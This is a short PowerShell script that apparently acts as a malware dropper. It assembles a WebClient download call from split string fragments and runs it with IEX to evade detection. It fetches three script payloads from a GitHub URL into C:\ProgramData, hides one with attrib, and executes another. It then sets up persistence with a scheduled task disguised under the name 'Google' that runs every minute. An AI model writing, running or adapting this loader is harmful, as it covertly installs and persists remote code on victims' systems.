$p = 'C:\ProgramData\'

$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adFile(''https://raw.githubusercontent.com/wasawalid/getv/main/spamget/vbe.text'',$p+ ''updata.vbe'')';$TC=IEX ($c1,$c4,$c3 -Join '');

attrib +h +s +r C:\ProgramData\updata.vbe
Start-Sleep -s 30

$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adFile(''https://raw.githubusercontent.com/wasawalid/getv/main/spamget/updatagot.ps1'',$p+ ''updatagot.ps1'')';$TC=IEX ($c1,$c4,$c3 -Join '');

Start-Sleep -s 30
$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adFile(''https://raw.githubusercontent.com/wasawalid/getv/main/spamget/runps1.text'',$p+ ''runvb.vbs'')';$TC=IEX ($c1,$c4,$c3 -Join '');

Start-Sleep -s 30
Invoke-Item "C:\ProgramData\runvb.vbs";

schtasks.exe /create /tn Google /sc minute  /st 00:10 /tr C:\Program Files\updata.vbe
attrib +h +s +r C:\ProgramData\updata.vbe
